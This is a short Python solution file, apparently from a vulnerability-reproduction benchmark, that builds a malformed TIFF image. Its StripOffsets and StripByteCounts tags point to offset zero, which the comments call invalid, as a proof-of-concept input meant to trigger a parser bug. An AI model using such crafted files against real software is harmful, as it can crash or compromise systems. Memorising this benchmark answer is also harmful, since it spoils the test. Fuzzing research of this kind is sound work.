import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        size = 162
        b = bytearray(size)

        # TIFF header: little-endian, version 42, first IFD at offset 8
        b[0:2] = b'II'
        b[2:4] = struct.pack('<H', 42)
        b[4:8] = struct.pack('<I', 8)

        def ifd_entry(tag: int, typ: int, count: int, value_or_offset: int, inline_short: bool = False) -> bytes:
            if inline_short:
                v = struct.pack('<H', value_or_offset) + b'\x00\x00'
                return struct.pack('<HHI', tag, typ, count) + v
            else:
                return struct.pack('<HHII', tag, typ, count, value_or_offset)

        # IFD with 9 entries
        off = 8
        entries = []
        entries.append(ifd_entry(256, 4, 1, 1))           # ImageWidth = 1
        entries.append(ifd_entry(257, 4, 1, 128))         # ImageLength = 128 (so strips can be 128 with RowsPerStrip=1)
        entries.append(ifd_entry(258, 3, 1, 8, True))     # BitsPerSample = 8
        entries.append(ifd_entry(259, 3, 1, 1, True))     # Compression = 1
        entries.append(ifd_entry(262, 3, 1, 1, True))     # PhotometricInterpretation = 1
        entries.append(ifd_entry(273, 4, 128, 0))         # StripOffsets: offline tag with value offset of zero (invalid)
        entries.append(ifd_entry(277, 3, 1, 1, True))     # SamplesPerPixel = 1
        entries.append(ifd_entry(278, 4, 1, 1))           # RowsPerStrip = 1
        entries.append(ifd_entry(279, 4, 128, 0))         # StripByteCounts: offline tag with value offset of zero (invalid)

        b[off:off+2] = struct.pack('<H', len(entries))
        off += 2
        for e in entries:
            b[off:off+12] = e
            off += 12
        b[off:off+4] = struct.pack('<I', 0)  # next IFD offset

        return bytes(b)